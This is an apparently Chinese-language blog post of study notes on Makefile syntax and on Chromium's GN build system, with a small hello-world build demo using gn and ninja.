        <content type="html"><![CDATA[<h1 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h1><p><code>makefile</code>是一个包含一组指令的文件，<code>make build</code>自动化工具使用这些指令來生成目标。</p><p>优点：自动化编译，可以极大的提高了软件开发的效率。</p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><strong>target</strong></p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。</p><p><strong>prerequisites</strong></p><p>生成该target所依赖的文件和<code>/</code>或target。反斜杠（ <code>\</code> ）是换行符的意思。</p><p><strong>command</strong></p><p>该target要执行的命令（任意的shell命令）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello:hello.c</span></span><br><span class="line">gcc -c hello.c</span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br></pre></td></tr></table></figure><h2 id="工作流程浅析"><a href="#工作流程浅析" class="headerlink" title="工作流程浅析"></a>工作流程浅析</h2><ol><li>make会在当前目录下找<code>Makefile / makefile</code></li><li>找到后，会寻找第一个目标文件(target) <code>hello</code>，并作为最终的目标文件。</li><li>如果 <code>hello</code>不存在活或其依赖 <code>hello.c</code>的修改时间比 <code>hello</code>新，那么就会执行<code>command</code>来重新生成 <code>target</code></li></ol><p><strong>PS：一定要以一个 <code>Tab</code> 键作为开头</strong></p><p>make 会一层一层的寻找文件依赖关系，直至编译出第一个目标文件。如果在寻找的过程中出现错误，那么 make 就会退出并报错。</p><p>make 所着重的是寻找依赖关系，<code>command</code>的命令的正确与否是不关心的。</p><h2 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h2><h3 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h3><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>make支持三个通配符： <code>*</code> ， <code>?</code> 和 <code>~</code> </p><p><code>*</code>：匹配 0 或多个字符</p><p><code>?</code>：匹配任意一个字符</p><p><code>~</code>：Linux，<code>~</code> = <code>$HOME</code> Mac，则需要自己设置 <code>HOME</code>目录</p><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPATH = src:../headers</span><br></pre></td></tr></table></figure><p>设置搜索路径，<code>make</code>执行时，如果当前目录找不到，则到指定路径取搜寻。</p><p>另一种则是：<code>vpath</code>关键字，注意<strong>全小写</strong>。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vpath &lt;pattern&gt; &lt;directories&gt; #为符合模式&lt;pattern&gt;的文件指定搜索目录&lt;directories&gt;。</span><br><span class="line">vpath &lt;pattern&gt; #清除符合模式&lt;pattern&gt;的文件的搜索目录。</span><br><span class="line">vpath    #清除所有已被设置好了的文件搜索目录。</span><br><span class="line">eg1:</span><br><span class="line">vpath %.h ../headers #现在当前目录搜索，若没找到则在“../headers”目录下搜索所有以 .h 结尾的文件。</span><br><span class="line">eg2:</span><br><span class="line">vpath %.c foo:bar   #make按照vpath语句的先后顺序来执行搜索</span><br><span class="line">vpath %   blish   #其表示 .c 结尾的文件，先在“foo”目录，然后是“blish”，最后是“bar”目录。</span><br></pre></td></tr></table></figure><h4 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h4><p>“伪目标”并不是一个文件，只是一个标签，由于“伪目标”不是文件，所以make无法生成它的依赖关系和决定它是否要执行。</p><p>PS：伪目标不能和文件重名。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean  <span class="comment">#使用“.PHONY”来显式地指明一个目标是“伪目标”</span></span><br></pre></td></tr></table></figure><p>例如清空规则：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><h3 id="书写命令"><a href="#书写命令" class="headerlink" title="书写命令"></a>书写命令</h3><h4 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令"></a>显示命令</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo 正在编译XXX模块......</span><br></pre></td></tr></table></figure><p><code>@</code>是必须的，如果<code>make</code>执行时，带入<code>make</code>参数 <code>-n</code> 或 <code>--just-print</code> ，那么其只是显示命令，但不会执行命令。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5</span><br><span class="line">    pwd   <span class="comment">#打印当前目录</span></span><br><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5;pwd <span class="comment">#打印/home/focu5下的目录</span></span><br></pre></td></tr></table></figure><h4 id="命令出错"><a href="#命令出错" class="headerlink" title="命令出错"></a>命令出错</h4><p>有些命令执行结果的正确与否我们是不关心的，那么有两种办法可以解决：</p><ol><li>在命令前加 <code>-</code></li><li>执行 <code>make</code>的时候，加上 <code>-i / --ignore-errors</code>参数（这种做法会忽略掉所有命令的错误</li></ol><p>另外：参数的是 <code>-k</code> 或是 <code>--keep-going</code> ，指如果某规则中的命令出错了，那么就终止该规则的执行，但继续执行其它规则。</p><h4 id="定义命令包"><a href="#定义命令包" class="headerlink" title="定义命令包"></a>定义命令包</h4><p>定义这种命令序列的语法以 <code>define</code> 开始，以 <code>endef</code> 结束，骨架如下:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> 包名</span><br><span class="line">...</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line"><span class="keyword">endef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 $(包名) 来调用包</span></span><br></pre></td></tr></table></figure><p>包名不能和变量名重名。</p><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = hello.c</span><br><span class="line">tag = hello</span><br><span class="line"><span class="section">hello: <span class="variable">$(objects)</span></span></span><br><span class="line">gcc -o hello <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="section">.PHONA: clean</span></span><br><span class="line"><span class="section">.PHONA: clean1</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o *.out</span><br><span class="line"></span><br><span class="line"><span class="section">clean1:</span></span><br><span class="line">rm -f <span class="variable">$(tag)</span></span><br></pre></td></tr></table></figure><p>变量命名可以包含：数字、字符、下划线（可以是数字开头），但不能含有 <code>:</code> 、 <code>#</code> 、 <code>=</code> 或是空字符（空格、回车等）。<strong>变量名对大小写是敏感的</strong>。</p><p>变量在声明的时候要进行初始化，使用时最好用 <code>()或&#123;&#125;</code>将变量包裹起来，eg：<code>$(obj)   $&#123;obj&#125; </code> 另外<code>$$</code>则表示使用<code>$</code></p><p>变量会在使用它的时候精确展开。</p><h4 id="变量高级用法"><a href="#变量高级用法" class="headerlink" title="变量高级用法"></a>变量高级用法</h4><p><strong>变量值替换</strong></p><p>格式: <code>$(var:a=b)</code> 或是 <code>$&#123;var:a=b&#125;</code> 把 <code>a</code>均替换成 <code>b</code></p><p><strong>变量嵌套</strong></p><p>也就是用变量的值去做新的变量。个人觉得追加更简单一些。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">a := $(<span class="variable">$(x)</span>)  <span class="comment">#a = $(y), $(a) = z</span></span><br><span class="line">a := <span class="variable">$(x)</span> <span class="variable">$(y)</span> <span class="comment"># $(a) = y z</span></span><br><span class="line"></span><br><span class="line">y += <span class="variable">$(x)</span>  <span class="comment">#$(y) = z y</span></span><br></pre></td></tr></table></figure><h3 id="隐含规则"><a href="#隐含规则" class="headerlink" title="隐含规则"></a>隐含规则</h3><p>示例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①</span></span><br><span class="line">foo : foo.o bar.o</span><br><span class="line">    cc –o foo foo.o bar.o <span class="variable">$(CFLAGS)</span> <span class="variable">$(LDFLAGS)</span></span><br><span class="line"><span class="comment">#②</span></span><br><span class="line">foo.o : foo.c</span><br><span class="line">    cc –c foo.c <span class="variable">$(CFLAGS)</span></span><br><span class="line">bar.o : bar.c</span><br><span class="line">    cc –c bar.c <span class="variable">$(CFLAGS)</span></span><br></pre></td></tr></table></figure><p><code>makefile</code>会有自动推导的过程，所以我们写成①的形式会更简洁一些。</p><p>部分隐含规则：</p><ul><li><p><code>CC</code> : C语言编译程序。默认命令是 <code>cc</code>   </p></li><li><p><code>CXX</code> : C++语言编译程序。默认命令是 <code>g++</code></p></li><li><p><code>RM</code> : 删除文件命令。默认命令是 <code>rm –f</code></p></li><li><p><code>CFLAGS</code> : C语言编译器参数。</p></li><li><p><code>CXXFLAGS</code> : C++语言编译器参数。</p></li><li><p><code>LDFLAGS</code> : 链接器参数。（如： <code>ld</code> ）</p></li><li><p>使用的时候请用：$(CC) 、$(RM) 等</p><p>  <a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html">更详细参考这里</a></p></li></ul><p>示例：</p><p>把所有的 <code>.c</code> 文件都编译成 <code>.o</code> 文件.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>其中， <code>$@</code> 表示所有的目标的挨个值， <code>$&lt;</code> 表示了所有依赖目标的挨个值。</p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><ul><li><code>$@</code> : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么， <code>$@</code> 就是匹配于目标中模式定义的集合。</li><li><code>$%</code> : 仅当目标是函数库文件中，表示规则中的目标成员名。</li><li><code>$&lt;</code> : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 <code>%</code> ）定义的，那么 <code>$&lt;</code> 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</li><li><code>$?</code> : 所有比目标新的依赖目标的集合。以空格分隔。</li><li><code>$^</code> : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那么这个变量会去除重复的依赖目标，只保留一份。</li><li><code>$+</code> : 这个变量很像 <code>$^</code> ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</li></ul><h3 id="Makefile中一些GNU约定俗成的伪目标"><a href="#Makefile中一些GNU约定俗成的伪目标" class="headerlink" title="Makefile中一些GNU约定俗成的伪目标"></a>Makefile中一些GNU约定俗成的伪目标</h3><table><thead><tr><th align="left">伪目标</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">all</td><td align="left">所有目标的目标，其功能一般是编译所有的目标</td></tr><tr><td align="left">clean</td><td align="left">删除所有被make创建的文件</td></tr><tr><td align="left">install</td><td align="left">安装已编译好的程序，其实就是把目标可执行文件拷贝到指定的目录中去</td></tr><tr><td align="left">print</td><td align="left">列出改变过的源文件</td></tr><tr><td align="left">tar</td><td align="left">把源程序打包备份. 也就是一个tar文件</td></tr><tr><td align="left">dist</td><td align="left">创建一个压缩文件, 一般是把tar文件压成Z文件. 或是gz文件</td></tr><tr><td align="left">TAGS</td><td align="left">更新所有的目标, 以备完整地重编译使用</td></tr><tr><td align="left">check 或 test</td><td align="left">一般用来测试makefile的流程</td></tr></tbody></table><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://seisman.github.io/how-to-write-makefile/index.html"> 跟我一起写Makefile</a></p><p><a href="https://cloud.tencent.com/developer/article/1343894">https://cloud.tencent.com/developer/article/1343894</a></p><h1 id="GN"><a href="#GN" class="headerlink" title="GN"></a>GN</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>GN是一种元构建系统，生成Ninja构建文件（Ninja build files），相较GYP而言，具有如下优点：</p><ol><li>可读性更好，更容易编写和维护。</li><li>速度更快，谷歌官方给的数据是20倍的速度提升。</li><li>修改GN文件后，执行ninja构建时会自动更新Ninja构建文件。</li><li>更简单的模块依赖，提供了public_deps, data_deps等，在GYP中，只有一种目标依赖，导致依赖关系错综复杂，容易引入不必要的模块依赖。</li><li>提供了更好的工具查询模块依赖图谱。这在GYP构建系统中是一个噩梦，要查一个目标依赖哪些模块或者一个模块被哪些目标依赖几乎是不可能的。</li><li>更好的调试支持。在GN中，只需要一条print语句就可以解决。</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>在 chromium 的 src 目录下创建一个新的 <code>test</code>文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~/Desktop/chromium/src/<span class="built_in">test</span>$ ls</span><br><span class="line">BUILD.gn  demo.cc</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Hello, world.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;BUILD.gn</span><br><span class="line">group(&quot;test&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    &quot;:hello_world&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">executable(&quot;hello_world&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;demo.cc&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在根目录的 <code>BUILD.gn</code>添加如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">group(&quot;gn_all&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line"></span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    ...</span><br><span class="line">    &quot;&#x2F;&#x2F;url:url_unittests&quot;,</span><br><span class="line">    &quot;&#x2F;&#x2F;test&quot;,  ——————————————&gt; 添加目录</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>然后编译就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ gn gen out&#x2F;test</span><br><span class="line">Done. Made 17759 targets from 2922 files in 5566ms</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ ninja -C out&#x2F;test hello_world</span><br><span class="line">ninja: Entering directory &#96;out&#x2F;test&#39;</span><br><span class="line">[60&#x2F;60] LINK .&#x2F;hello_world</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ .&#x2F;out&#x2F;test&#x2F;hello_world </span><br><span class="line">Hello, world.</span><br></pre></td></tr></table></figure><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><ol><li>在当前目录中查找<code>.gn</code>文件并向上遍历目录树，直到找到<code>.gn</code>。将此目录设置为根目录，并解释此文件以查找生成配置文件的名称。</li><li>执行构建配置文件（这是默认工具链）。</li><li>将<code>BUILD.gn</code>文件加载到根目录中。</li><li>递归加载其他目录中的<code>BUILD.gn</code>以解析所有当前依赖项。如果在指定位置找不到生成文件，GN将在<code>tools/GN/secondary</code>内的相应位置查找</li><li>解析目标的依赖项后，将<code>.ninja</code>文件写出到磁盘。</li><li>当所有目标都解决后，写出<code>root build.ninja</code>文件。</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>执行的第一个文件是构建配置文件。此文件的名称在标记存储库根目录的<code>.gn</code>文件中指定。在Chrome中是<code>src/build/config/BUILDCONFIG.gn</code>只有一个构建配置文件。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>目标是构建图中的一个节点。它通常代表将要生成的某种类型的可执行文件或库文件。目标取决于其他目标。内置的目标类型（请参阅<code>gn help &lt;targettype&gt;</code>以获取更多帮助）是：</p><ul><li><code>action</code>：运行一个脚本来生成一个文件。</li><li><code>action_foreach</code>：为每个源文件运行一次脚本。</li><li><code>bundle_data</code>：声明数据加入到Mac / iOS包。</li><li><code>create_bundle</code>：创建一个Mac / iOS包。</li><li><code>executable</code>：生成一个可执行文件。</li><li><code>group</code>：引用一个或多个其他目标的虚拟依赖关系节点。</li><li><code>shared_library</code>：.dll或.so。</li><li><code>loadable_module</code>：.dll或.so只能在运行时加载。</li><li><code>source_set</code>：一个轻量级的虚拟静态库（通常比真正的静态库更可取，因为它的构建速度会更快）。</li><li><code>static_library</code>：.lib或.a文件（通常你会想要一个<code>source_set</code>）。</li></ul><p>更多资料可以看官方文档。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md">https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> makefile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
